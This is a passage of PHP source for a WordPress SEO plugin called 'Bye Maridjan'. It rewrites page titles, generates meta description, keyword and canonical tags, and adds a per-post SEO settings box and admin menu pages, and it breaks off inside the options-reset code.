<?php
/*
Plugin Name: Bye Maridjan
Plugin URI: http://www.papadestra.com/
Description: Several functions for optimization SEO blog.
Version: 0.3
Author: Papa Destra
Author URI: http://www.papadestra.com/
Stable tag: 0.3
*/
/*
= 0.3 =
* Remove social media links, under the item
* Add FB like the standard size
* Enable the plugin for all posts / pages: FALSE
- Tambah fungsi "hehed"
*/
class maridjan_SEO
{
	var $maximum_description_length = 160;
	var $minimum_description_length = 1;
	function maridjan_SEO()
	{
		global $Maridjan_SEO_aturan;
	}
	function strtolower($gancuk)
	{
		return mb_strtolower($gancuk, get_bloginfo('charset'));
	}
	function strtoupper($gancuk)
	{
		return mb_strtoupper($gancuk, get_bloginfo('charset'));
	}
	function capitalize($gancuk)
	{
		return mb_convert_case($gancuk, MB_CASE_TITLE, get_bloginfo('charset'));
	}
	
	function is_static_front_page()
	{
		global $wp_query;
		
		$post = $wp_query->get_queried_object();
		
		return get_option('show_on_front') == 'page' && is_page() && $post->ID == get_option('page_on_front');
	}
	
	function is_static_posts_page()
	{
		global $wp_query;
		
		$post = $wp_query->get_queried_object();
		
		return get_option('show_on_front') == 'page' && is_home() && $post->ID == get_option('page_for_posts');
	}
	function maridjancahaya_halaman_khusus()
	{
		global $Maridjan_SEO_aturan;

		$currenturl = trim(esc_url($_SERVER['REQUEST_URI'], '/'));

		$excludedstuff = explode(',', $Maridjan_SEO_aturan['maridjancahaya_ex_pages']);

		foreach ($excludedstuff as $exedd)
		{
			$exedd = trim($exedd);

			if ($exedd)
			{
				if (stristr($currenturl, $exedd))
				{
					return true;
				}
			}
		}

		return false;
	}
	
	function metu_callback_nggo_judul($content)
	{
		return $this->rewrite_title($content);
	}
	function internationalize($in)
	{
		if (function_exists('langswitch_filter_langs_with_message'))
		{
			$in = langswitch_filter_langs_with_message($in);
		}

		if (function_exists('polyglot_filter'))
		{
			$in = polyglot_filter($in);
		}

		if (function_exists('qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage'))
		{
			$in = qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage($in);
		}

		$in = apply_filters('localization', $in);

		return $in;
	}
	function init()
	{
		load_plugin_textdomain('maridjan_SEO', false, dirname(plugin_basename(__FILE__)));
	}
	function template_redirect()
	{
		global $wp_query;
		global $Maridjan_SEO_aturan;

		$post = $wp_query->get_queried_object();

		if ($this->maridjancahaya_halaman_khusus())
		{
			return;
		}

		if (is_feed())
		{
			return;
		}

		if (is_single() || is_page())
		{
			$maridjancahaya_disable = htmlspecialchars(stripcslashes(get_post_meta($post->ID, '_maridjancahayap_disable', true)));
			
			if ($maridjancahaya_disable)
			{
				return;
			}
		}

		if ($Maridjan_SEO_aturan['maridjancahaya_tulis_kembali'])
		{
			ob_start(array($this, 'metu_callback_nggo_judul')); 
		}
	}

	function wp_head()
	{
		if (is_feed()) 
		{
			return;
		}

		global $wp_query;
		global $Maridjan_SEO_aturan;

		$post = $wp_query->get_queried_object();

		$meta_string = null;

		if ($this->is_static_posts_page())
		{

			$title = strip_tags(apply_filters('single_post_title', $post->post_title));
		}

		if (is_single() || is_page())
		{
			$maridjancahaya_disable = htmlspecialchars(stripcslashes(get_post_meta($post->ID, '_maridjancahayap_disable', true)));

			if ($maridjancahaya_disable)
			{
				return;
			}
		}

		if ($this->maridjancahaya_halaman_khusus())
		{
			return;
		}

		if ($Maridjan_SEO_aturan['maridjancahaya_tulis_kembali'])
		{
			
			if (function_exists('ob_list_handlers'))
			{
				$active_handlers = ob_list_handlers();
			}
			else
			{
				$active_handlers = array();
			}
			
			if ((sizeof($active_handlers) > 0) &&
				(strtolower($active_handlers[sizeof($active_handlers) - 1]) ==
				strtolower('maridjan_SEO::metu_callback_nggo_judul')))
			{
				ob_end_flush(); 
			}
			else
			{
			}
		}

		if ((is_home() && $Maridjan_SEO_aturan['maridjancahaya_home_keywords'] &&
			!$this->is_static_posts_page()) || $this->is_static_front_page())
		{
			$keywords = trim($this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_keywords']));
		}
		elseif ($this->is_static_posts_page() && !$Maridjan_SEO_aturan['maridjancahaya_dynamic_postspage_keywords']) 
		{
			$keywords = stripcslashes($this->internationalize(get_post_meta($post->ID, "_maridjancahayap_keywords", true)));
		}
		else
		{
			$keywords = $this->get_all_keywords();
		}

		if (is_single() || is_page() || $this->is_static_posts_page())
		{
			if ($this->is_static_front_page())
			{
				$description = trim(stripcslashes($this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_description'])));
			}
			else
			{
				$description = $this->get_post_description($post);
				$description = apply_filters('maridjancahayap_description', $description);
			}
		}
		elseif (is_home())
		{
			$description = trim(stripcslashes($this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_description'])));
		}
		elseif (is_category())
		{
			$description = $this->internationalize(category_description());
		}

		if (isset($description) && (strlen($description) > $this->minimum_description_length) &&
			!(is_home() && is_paged()))
		{
			$description = trim(strip_tags($description));
			$description = str_replace('"', '', $description);
			
			$description = str_replace("\r\n", ' ', $description);
			
			$description = str_replace("\n", ' ', $description);

			if (!isset($meta_string))
			{
				$meta_string = '';
			}

			$description_format = $Maridjan_SEO_aturan['maridjancahaya_description_format'];

			if (!isset($description_format) || empty($description_format))
			{
				$description_format = "%description%";
			}
			
			$description = str_replace('%description%', $description, $description_format);
			$description = str_replace('%blog_title%', get_bloginfo('name'), $description);
			$description = str_replace('%blog_description%', get_bloginfo('description'), $description);
			$description = str_replace('%wp_title%', $this->get_original_title(), $description);

			if ($Maridjan_SEO_aturan['maridjancahaya_can'] && is_attachment())
			{
				$url = $this->maridjancahaya_mrt_get_url($wp_query);
                
				if ($url)
				{
					preg_match_all('/(\d+)/', $url, $matches);

					if (is_array($matches))
					{
						$uniqueDesc = join('', $matches[0]);
					}
				}
				
				$description .= ' ' . $uniqueDesc;
			}
			
			$meta_string .= '<meta name="description" content="' . esc_attr($description) . '" />';
		}
		
		$keywords = apply_filters('maridjancahayap_keywords', $keywords);
		
		if (isset($keywords) && !empty($keywords) && !(is_home() && is_paged()))
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}
			
			$meta_string .= '<meta name="keywords" content="' . esc_attr($keywords) . '" />';
		}

		if (function_exists('is_tag'))
		{
			$is_tag = is_tag();
		}
		
		if ((is_category() && $Maridjan_SEO_aturan['maridjancahaya_category_noindex']) ||
			(!is_category() && is_archive() &&!$is_tag && $Maridjan_SEO_aturan['maridjancahaya_archive_noindex']) ||
			($Maridjan_SEO_aturan['maridjancahaya_tags_noindex'] && $is_tag))
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}
			
			$meta_string .= '<meta name="robots" content="noindex,follow" />';
		}
		
		$page_meta = stripcslashes($Maridjan_SEO_aturan['maridjancahaya_page_meta_tags']);
		$post_meta = stripcslashes($Maridjan_SEO_aturan['maridjancahaya_post_meta_tags']);
		$home_meta = stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_meta_tags']);
		
		if (is_page() && isset($page_meta) && !empty($page_meta) || $this->is_static_posts_page())
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}
			
			$meta_string .= $page_meta;
		}
		
		if (is_single() && isset($post_meta) && !empty($post_meta))
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}

			$meta_string .= $post_meta;
		}

		if (is_home() && !empty($home_meta))
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}

			$meta_string .= $home_meta;
		}

		$home_google_site_verification_meta_tag = stripcslashes($Maridjan_SEO_aturan['maridjancahaya_home_google_site_verification_meta_tag']);

		if (is_home() && !empty($home_google_site_verification_meta_tag))
		{
			if (isset($meta_string))
			{
				$meta_string .= "\n";
			}

			$meta_string .= wp_kses($home_google_site_verification_meta_tag, array('meta' => array('name' => array(), 'content' => array())));
		}

		if ($meta_string != null)
		{
			echo wp_kses($meta_string, array('meta' => array('name' => array(), 'content' => array()))) . "\n";
		}

		if ($Maridjan_SEO_aturan['maridjancahaya_can'])
		{
			$url = $this->maridjancahaya_mrt_get_url($wp_query);

			if ($url)
			{
				$url = apply_filters('maridjancahayap_canonical_url', $url);

				echo '<link rel="canonical" href="' . esc_url($url) . '" />' . "\n";
			}
		}
	}
	
	function maridjancahaya_mrt_get_url($query)
	{
		global $Maridjan_SEO_aturan;

		if ($query->is_404 || $query->is_search)
		{
			return false;
		}

		$haspost = count($query->posts) > 0;
		$has_ut = function_exists('user_trailingslashit');

		if (get_query_var('m'))
		{
			$m = preg_replace('/[^0-9]/', '', get_query_var('m'));
			
			switch (strlen($m))
			{
			case 4:
				$link = get_year_link($m);
				break;
			case 6:
				$link = get_month_link(substr($m, 0, 4), substr($m, 4, 2));
				break;
			case 8:
				$link = get_day_link(substr($m, 0, 4), substr($m, 4, 2), substr($m, 6, 2));
				break;
			default:
				return false;
			}
		}
		elseif (($query->is_single || $query->is_page) && $haspost)
		{
			$post = $query->posts[0];
			$link = get_permalink($post->ID);
			$link = $this->yoast_get_paged($link); 
		}
		elseif ($query->is_author && $haspost)
		{
			$author = get_userdata(get_query_var('author'));

			if ($author === false)
				return false;

			$link = get_author_link(false, $author->ID, $author->user_nicename);
		}
		elseif ($query->is_category && $haspost)
		{
			$link = get_category_link(get_query_var('cat'));
			$link = $this->yoast_get_paged($link);
		}
		elseif ($query->is_tag  && $haspost)
		{
			$tag = get_term_by('slug', get_query_var('tag'), 'post_tag');
			
			if (!empty($tag->term_id))
			{
				$link = get_tag_link($tag->term_id);
			}
			
			$link = $this->yoast_get_paged($link);			
		}
		elseif ($query->is_day && $haspost)
		{
			$link = get_day_link(get_query_var('year'), get_query_var('monthnum'), get_query_var('day'));
		}
		elseif ($query->is_month && $haspost)
		{
			$link = get_month_link(get_query_var('year'), get_query_var('monthnum'));
		}
		elseif ($query->is_year && $haspost)
		{
			$link = get_year_link(get_query_var('year'));
		}
		elseif ($query->is_home)
		{
			if ((get_option('show_on_front') == 'page') && ($pageid = get_option('page_for_posts')))
			{
				$link = get_permalink($pageid);
				$link = $this->yoast_get_paged($link);
				$link = trailingslashit($link);
			}
			else
			{
				$link = get_option('home');
				$link = $this->yoast_get_paged($link);
				$link = trailingslashit($link);
			}
		}
		else
		{
			return false;
		}
		
		return $link;
	}
	
	function yoast_get_paged($link)
	{
		$page = get_query_var('paged');

		if ($page && $page > 1)
		{
			$link = trailingslashit($link) ."page/". "$page";

			if ($has_ut)
			{
				$link = user_trailingslashit($link, 'paged');
			}
			else
			{
				$link .= '/';
			}
		}

		return $link;
	}

	function get_post_description($post)
	{
		global $Maridjan_SEO_aturan;

		$description = trim(stripcslashes($this->internationalize(get_post_meta($post->ID, "_maridjancahayap_description", true))));

		if (!$description)
		{
			$description = $this->trim_excerpt_without_filters_full_length($this->internationalize($post->post_excerpt));

			if (!$description && $Maridjan_SEO_aturan["maridjancahaya_generate_descriptions"])
			{
				$description = $this->trim_excerpt_without_filters($this->internationalize($post->post_content));
			}				
		}
		$description = preg_replace("/\s\s+/", " ", $description);

		return $description;
	}
	function replace_title($content, $title)
	{
		return preg_replace('/<title>(.*?)<\/title>/ms', '<title>' . esc_html($title) . '</title>', $content, 1);
	}
	
	function get_original_title()
	{
		global $wp_query;
		global $Maridjan_SEO_aturan;
		
		if (!$wp_query)
		{
			return null;	
		}
		
		$post = $wp_query->get_queried_object();
		
		global $s;

		$title = null;
		
		if (is_home())
		{
			$title = get_option('blogname');
		}
		elseif (is_single())
		{
			$title = $this->internationalize(wp_title('', false));
		}
		elseif (is_search() && isset($s) && !empty($s))
		{
			if (function_exists('attribute_escape'))
			{
				$search = attribute_escape(stripcslashes($s));
			}
			else
			{
				$search = wp_specialchars(stripcslashes($s), true);
			}
			
			$search = $this->capitalize($search);
			$title = $search;
		}
		elseif (is_category() && !is_feed())
		{
			$category_description = $this->internationalize(category_description());
			$category_name = ucwords($this->internationalize(single_cat_title('', false)));
			$title = $category_name;
		}
		elseif (is_page())
		{
			$title = $this->internationalize(wp_title('', false));
		}
		elseif (function_exists('is_tag') && is_tag())
		{
			$tag = $this->internationalize(wp_title('', false));

			if ($tag)
			{
				$title = $tag;
			}
		}
		else if (is_archive())
		{
			$title = $this->internationalize(wp_title('', false));
		}
		else if (is_404())
		{
			$title_format = $Maridjan_SEO_aturan['maridjancahaya_404_title_format'];

			$new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
			$new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
			$new_title = str_replace('%request_url%', esc_url($_SERVER['REQUEST_URI']), $new_title);
			$new_title = str_replace('%request_words%', $this->request_as_words(esc_url($_SERVER['REQUEST_URI'])), $new_title);
			
			$title = $new_title;
		}

		return trim($title);
	}
	
	function paged_title($title)
	{
		global $paged;
		global $Maridjan_SEO_aturan;
		global $STagging;

		if (is_paged() || (isset($STagging) && $STagging->is_tag_view() && $paged))
		{
			$part = $this->internationalize($Maridjan_SEO_aturan['maridjancahaya_paged_format']);

			if (isset($part) || !empty($part))
			{
				$part = " " . trim($part);
				$part = str_replace('%page%', $paged, $part);
				$title .= $part;
			}
		}

		return $title;
	}

	function rewrite_title($header)
	{
		global $Maridjan_SEO_aturan;
		global $wp_query;
		
		if (!$wp_query)
		{
			return $header;	
		}
		
		$post = $wp_query->get_queried_object();
				global $s;
		
		global $STagging;

		if (is_home() && !$this->is_static_posts_page())
		{
			$title = $this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_title']);
			
			if (empty($title))
			{
				$title = $this->internationalize(get_option('blogname'));
			}

			$title = $this->paged_title($title);
			$header = $this->replace_title($header, $title);
		}
		else if (is_attachment())
		{
			$title = get_the_title($post->post_parent).' '.$post->post_title.' – '.get_option('blogname');
			$header = $this->replace_title($header,$title);
		}
		else if (is_single())
		{
			$authordata = get_userdata($post->post_author);
			$categories = get_the_category();
			$category = '';
			
			if (count($categories) > 0)
			{
				$category = $categories[0]->cat_name;
			}

			$title = $this->internationalize(get_post_meta($post->ID, "_maridjancahayap_title", true));
			
			if (!$title)
			{
				$title = $this->internationalize(get_post_meta($post->ID, "title_tag", true));
				
				if (!$title)
				{
					$title = $this->internationalize(wp_title('', false));
				}
			}

			$title_format = $Maridjan_SEO_aturan['maridjancahaya_post_title_format'];

			$new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
			$new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
			$new_title = str_replace('%post_title%', $title, $new_title);
			$new_title = str_replace('%category%', $category, $new_title);
			$new_title = str_replace('%category_title%', $category, $new_title);
			$new_title = str_replace('%post_author_login%', $authordata->user_login, $new_title);
			$new_title = str_replace('%post_author_nicename%', $authordata->user_nicename, $new_title);
			$new_title = str_replace('%post_author_firstname%', ucwords($authordata->first_name), $new_title);
			$new_title = str_replace('%post_author_lastname%', ucwords($authordata->last_name), $new_title);

			$title = $new_title;
			$title = trim($title);
			$title = apply_filters('maridjancahayap_title_single',$title);

			$header = $this->replace_title($header, $title);
		}
		elseif (is_search() && isset($s) && !empty($s))
		{
			if (function_exists('attribute_escape'))
			{
				$search = attribute_escape(stripcslashes($s));
			}
			else
			{
				$search = wp_specialchars(stripcslashes($s), true);
			}

			$search = $this->capitalize($search);
			$title_format = $Maridjan_SEO_aturan['maridjancahaya_search_title_format'];

			$title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
			$title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
			$title = str_replace('%search%', $search, $title);
			
			$header = $this->replace_title($header, $title);
		}
		elseif (is_category() && !is_feed())
		{
			$category_description = $this->internationalize(category_description());

			if($Maridjan_SEO_aturan['maridjancahaya_cap_cats'])
			{
				$category_name = ucwords($this->internationalize(single_cat_title('', false)));
			}
			else
			{
				$category_name = $this->internationalize(single_cat_title('', false));
			}			

			$title_format = $Maridjan_SEO_aturan['maridjancahaya_category_title_format'];

			$title = str_replace('%category_title%', $category_name, $title_format);
			$title = str_replace('%category_description%', $category_description, $title);
			$title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title);
			$title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
			$title = $this->paged_title($title);
			
			$header = $this->replace_title($header, $title);
		}
		elseif (is_page() || $this->is_static_posts_page())
		{
			$authordata = get_userdata($post->post_author);

			if ($this->is_static_front_page())
			{
				if ($this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_title']))
				{
					$home_title = $this->internationalize($Maridjan_SEO_aturan['maridjancahaya_home_title']);
					$home_title = apply_filters('maridjancahayap_home_page_title',$home_title);
					
					$header = $this->replace_title($header, $home_title);
				}
			}
			else
			{
				$title = $this->internationalize(get_post_meta($post->ID, "_maridjancahayap_title", true));
				
				if (!$title)
				{
					$title = $this->internationalize(wp_title('', false));
				}

				$title_format = $Maridjan_SEO_aturan['maridjancahaya_page_title_format'];

				$new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
				$new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
				$new_title = str_replace('%page_title%', $title, $new_title);
				$new_title = str_replace('%page_author_login%', $authordata->user_login, $new_title);
				$new_title = str_replace('%page_author_nicename%', $authordata->user_nicename, $new_title);
				$new_title = str_replace('%page_author_firstname%', ucwords($authordata->first_name), $new_title);
				$new_title = str_replace('%page_author_lastname%', ucwords($authordata->last_name), $new_title);

				$title = trim($new_title);
				$title = apply_filters('maridjancahayap_title_page', $title);

				$header = $this->replace_title($header, $title);
			}
		}
		elseif (function_exists('is_tag') && is_tag())
		{
			$tag = $this->internationalize(wp_title('', false));

			if ($tag)
			{
				$tag = $this->capitalize($tag);
				$title_format = $Maridjan_SEO_aturan['maridjancahaya_tag_title_format'];
	            
				$title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
				$title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
				$title = str_replace('%tag%', $tag, $title);
				$title = $this->paged_title($title);
				
				$header = $this->replace_title($header, $title);
			}
		}
		elseif (isset($STagging) && $STagging->is_tag_view()) // simple tagging support
		{
			$tag = $STagging->search_tag;
			
			if ($tag)
			{
				$tag = $this->capitalize($tag);
				$title_format = $Maridjan_SEO_aturan['maridjancahaya_tag_title_format'];

				$title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
				$title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
				$title = str_replace('%tag%', $tag, $title);
				$title = $this->paged_title($title);

				$header = $this->replace_title($header, $title);
			}
		}
		else if (is_archive())
		{
			$date = $this->internationalize(wp_title('', false));
			$title_format = $Maridjan_SEO_aturan['maridjancahaya_archive_title_format'];

			$new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
			$new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
			$new_title = str_replace('%date%', $date, $new_title);

			$title = trim($new_title);
			$title = $this->paged_title($title);

			$header = $this->replace_title($header, $title);
		}
		else if (is_404())
		{
			$title_format = $Maridjan_SEO_aturan['maridjancahaya_404_title_format'];

			$new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
			$new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
			$new_title = str_replace('%request_url%', esc_url($_SERVER['REQUEST_URI']), $new_title);
			$new_title = str_replace('%request_words%', $this->request_as_words(esc_url($_SERVER['REQUEST_URI'])), $new_title);
			$new_title = str_replace('%404_title%', $this->internationalize(wp_title('', false)), $new_title);

			$header = $this->replace_title($header, $new_title);
		}
		
		return $header;
	}
	function request_as_words($request)
	{
		$request = htmlspecialchars($request);
		$request = str_replace('.html', ' ', $request);
		$request = str_replace('.htm', ' ', $request);
		$request = str_replace('.', ' ', $request);
		$request = str_replace('/', ' ', $request);

		$request_a = explode(' ', $request);
		$request_new = array();

		foreach ($request_a as $token)
		{
			$request_new[] = ucwords(trim($token));
		}

		$request = implode(' ', $request_new);

		return $request;
	}
	
	function trim_excerpt_without_filters($text)
	{
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = preg_replace( '|\[(.+?)\](.+?\[/\\1\])?|s', '', $text);
		$text = strip_tags($text);

		$max = $this->maximum_description_length;

		if ($max < strlen($text))
		{
			while ($text[$max] != ' ' && $max > $this->minimum_description_length)
			{
				$max--;
			}
		}

		$text = substr($text, 0, $max);

		return trim(stripcslashes($text));
	}
	
	function trim_excerpt_without_filters_full_length($text)
	{
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = preg_replace( '|\[(.+?)\](.+?\[/\\1\])?|s', '', $text);
		$text = strip_tags($text);

		return trim(stripcslashes($text));
	}
		function get_all_keywords()
	{
		global $posts;
		global $Maridjan_SEO_aturan;

		if (is_404())
		{
			return null;
		}
				if (!is_home() && !is_page() && !is_single() &&!$this->is_static_front_page() && !$this->is_static_posts_page()) 
		{
			return null;
		}

		$keywords = array();
		
		if (is_array($posts))
		{
			foreach ($posts as $post)
			{
				if ($post)
				{
					$keywords_a = $keywords_i = null;
					$description_a = $description_i = null;

					$id = is_attachment() ? $post->post_parent : $post->ID; 

					$keywords_i = stripcslashes($this->internationalize(get_post_meta($id, "_maridjancahayap_keywords", true)));
					$keywords_i = str_replace('"', '', $keywords_i);
	                
					if (isset($keywords_i) && !empty($keywords_i))
					{
						$traverse = explode(',', $keywords_i);
	                	
						foreach ($traverse as $keyword) 
						{
							$keywords[] = $keyword;
						}
					}
	                
					if ($Maridjan_SEO_aturan['maridjancahaya_use_tags_as_keywords'])
					{
						if (function_exists('get_the_tags'))
						{
							$tags = get_the_tags($id);

							if ($tags && is_array($tags))
							{
								foreach ($tags as $tag)
								{
									$keywords[] = $this->internationalize($tag->name);
								}
							}
						}
					}
					$autometa = stripcslashes(get_post_meta($id, 'autometa', true));

					if (isset($autometa) && !empty($autometa))
					{
						$autometa_array = explode(' ', $autometa);
						
						foreach ($autometa_array as $e) 
						{
							$keywords[] = $e;
						}
					}

					if ($Maridjan_SEO_aturan['maridjancahaya_use_categories'] && !is_page())
					{
						$categories = get_the_category($id); 

						foreach ($categories as $category)
						{
							$keywords[] = $this->internationalize($category->cat_name);
						}
					}
				}
			}
		}

		return $this->get_unique_keywords($keywords);
	}

	function get_unique_keywords($keywords)
	{
		$arr = array_map("strtolower", $keywords);

		$arr = array_unique($arr);

		return implode(',', $arr);
	}
	function is_admin()
	{
		return current_user_can('level_8');
	}

	function post_meta_tags($id)
	{
		$awmp_edit = $_POST['maridjancahaya_edit'];
		$nonce = $_POST['nonce-maridjancahayap-edit'];

		if (isset($awmp_edit) && !empty($awmp_edit) && wp_verify_nonce($nonce, 'edit-maridjancahayap-nonce'))
		{
			$keywords = $_POST["maridjancahaya_keywords"];
			$description = $_POST["maridjancahaya_description"];
			$title = $_POST["maridjancahaya_title"];
			$maridjancahaya_meta = $_POST["maridjancahaya_meta"];
			$maridjancahaya_disable = $_POST["maridjancahaya_disable"];
			$maridjancahaya_titleatr = $_POST["maridjancahaya_titleatr"];
			$maridjancahaya_menulabel = $_POST["maridjancahaya_menulabel"];
				
			delete_post_meta($id, '_maridjancahayap_keywords');
			delete_post_meta($id, '_maridjancahayap_description');
			delete_post_meta($id, '_maridjancahayap_title');
			delete_post_meta($id, '_maridjancahayap_titleatr');
			delete_post_meta($id, '_maridjancahayap_menulabel');
		
			if ($this->is_admin())
			{
				delete_post_meta($id, '_maridjancahayap_disable');
			}

			if (isset($keywords) && !empty($keywords))
			{
				add_post_meta($id, '_maridjancahayap_keywords', $keywords);
			}

			if (isset($description) && !empty($description))
			{
				add_post_meta($id, '_maridjancahayap_description', $description);
			}

			if (isset($title) && !empty($title))
			{
				add_post_meta($id, '_maridjancahayap_title', $title);
			}
		    
			if (isset($maridjancahaya_titleatr) && !empty($maridjancahaya_titleatr))
			{
				add_post_meta($id, '_maridjancahayap_titleatr', $maridjancahaya_titleatr);
			}

			if (isset($maridjancahaya_menulabel) && !empty($maridjancahaya_menulabel))
			{
				add_post_meta($id, '_maridjancahayap_menulabel', $maridjancahaya_menulabel);
			}				

			if (isset($maridjancahaya_disable) && !empty($maridjancahaya_disable) && $this->is_admin())
			{
				add_post_meta($id, '_maridjancahayap_disable', $maridjancahaya_disable);
			}
		}
	}

	function add_meta_tags_textinput()
	{
		global $post;

		$post_id = $post;
	    
		if (is_object($post_id))
		{
			$post_id = $post_id->ID;
		}

		// TODO: Probably esc_attr is more than enough
		$keywords = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_keywords', true))));
		$title = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_title', true))));
		$description = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_description', true))));
		$maridjancahaya_meta = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_meta', true))));
		$maridjancahaya_disable = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_disable', true))));
		$maridjancahaya_titleatr = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_titleatr', true))));
		$maridjancahaya_menulabel = esc_attr(htmlspecialchars(stripcslashes(get_post_meta($post_id, '_maridjancahayap_menulabel', true))));
	
?>
<script type="text/javascript">
function countChars(field, cntfield)
{
  cntfield.value = field.value.length;
}
</script>
<div id="postmaridjancahaya" class="postbox closed">
  <h3>
    <?php _e('Maridjan SEO', 'maridjan_SEO') ?>
  </h3>
  <div class="inside">
    <div id="postmaridjancahaya">
      <input value="maridjancahaya_edit" type="hidden" name="maridjancahaya_edit" />
      <input type="hidden" name="nonce-maridjancahayap-edit" value="<?php echo wp_create_nonce('edit-maridjancahayap-nonce'); ?>" />
      <table style="margin-bottom:40px">
        <tr>
          <th style="text-align:left;" colspan="2">
          </th>
        </tr>
        <tr>
          <th scope="row" style="text-align:right;">
            <?php _e('Title:', 'maridjan_SEO') ?>
          </th>
          <td>
            <input value="<?php echo $title ?>" type="text" name="maridjancahaya_title" size="62"/>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right;">
            <?php _e('Description:', 'maridjan_SEO') ?>
          </th>
          <td>
            <textarea name="maridjancahaya_description" rows="1" cols="60"
                onkeydown="countChars(document.post.maridjancahaya_description,document.post.length1)"
                onkeyup="countChars(document.post.maridjancahaya_description,document.post.length1)"><?php echo $description ?></textarea><br />
            <input readonly="" type="text" name="length1" size="3" maxlength="3" value="<?php echo strlen($description);?>" />
            <?php _e(' characters. Maximum of 160 chars for the description', 'maridjan_SEO') ?>
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right;">
            <?php _e('Keywords (comma separated):', 'maridjan_SEO') ?>
          </th>
          <td>
            <input value="<?php echo $keywords ?>" type="text" name="maridjancahaya_keywords" size="62" />
          </td>
        </tr>
<?php if ($this->is_admin()) { ?>
        <tr>
          <th scope="row" style="text-align:right; vertical-align:top;">
            <?php _e('Disable on this page/post:', 'maridjan_SEO')?>
          </th>
          <td>
            <input type="checkbox" name="maridjancahaya_disable" <?php if ($maridjancahaya_disable) echo 'checked="checked"'; ?> />
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right;">
            <?php _e('Title Attribute:', 'maridjan_SEO') ?>
          </th>
          <td>
            <input value="<?php echo $maridjancahaya_titleatr ?>" type="text" name="maridjancahaya_titleatr" size="62" />
          </td>
        </tr>
        <tr>
          <th scope="row" style="text-align:right;">
            <?php _e('Menu Label:', 'maridjan_SEO') ?>
          </th>
          <td>
            <input value="<?php echo $maridjancahaya_menulabel ?>" type="text" name="maridjancahaya_menulabel" size="62" />
          </td>
        </tr>
<?php } ?>
      </table>
    </div>
  </div>
</div>
<?php
	}
	function admin_menu()
	{
add_menu_page('Bye maridjan', 'Bye maridjan', 'manage_options', 'Bye_maridjan_utomo', 'brawijaya_develop');
add_submenu_page('Bye_maridjan_utomo', 'FeedBurner', 'FeedBurner', 8,basename(__FILE__), 'ol_feedburner_options_subpanel');
add_submenu_page('Bye_maridjan_utomo','Compression WP', 'Compression WP', 'administrator', 'compression','compression_options_page');
add_submenu_page('Bye_maridjan_utomo',"GetWIKI Options", "GetWIKI", 8, "wiki-plugin", 'getwiki_options');	
add_submenu_page('Bye_maridjan_utomo','Facebook Like Button Settings', 'FB Like Button', 10, 'facebook_like_unik', 'facebook_like_menu');
add_meta_box('facebook_like_meta', 'Facebook Like', "facebook_like_meta", "post");
add_submenu_page('Bye_maridjan_utomo','Ping-O-Matic ', 'Ping-O-Matic','manage_options' ,'develop_info','develop_info_function');
add_submenu_page('Bye_maridjan_utomo', __('Maridjan SEO', 'maridjancahaya'), __('Maridjan SEO', 'maridjancahaya'), 'administrator', __FILE__, array($this, 'options_panel'));

	}
	function options_panel()
	{
		$message = null;
		global $Maridjan_SEO_aturan;		
		
		if (!$Maridjan_SEO_aturan['maridjancahaya_cap_cats'])
		{
			$Maridjan_SEO_aturan['maridjancahaya_cap_cats'] = '1';
		}
		
		if ($_POST['action'] && $_POST['action'] == 'maridjancahaya_update' && $_POST['Submit_Default'] != '')
		{
			$nonce = $_POST['nonce-maridjancahayap'];
			if (!wp_verify_nonce($nonce, 'maridjancahayap-nonce'))
				die ( 'Security Check - If you receive this in error, log out and back in to WordPress');
			$message = __("Maridjan SEO Options Reset.", 'maridjancahaya');
			delete_option('maridjancahayap_options');
			$res_maridjancahayap_options = array(
				"maridjancahaya_can"=>1,
				"maridjancahaya_home_title"=>null,
				"maridjancahaya_home_description"=>'',
				"maridjancahaya_home_keywords"=>null,
				"maridjancahaya_max_words_excerpt"=>'something',
				"maridjancahaya_tulis_kembali"=>1,
				"maridjancahaya_post_title_format"=>'%post_title% | %blog_title%',
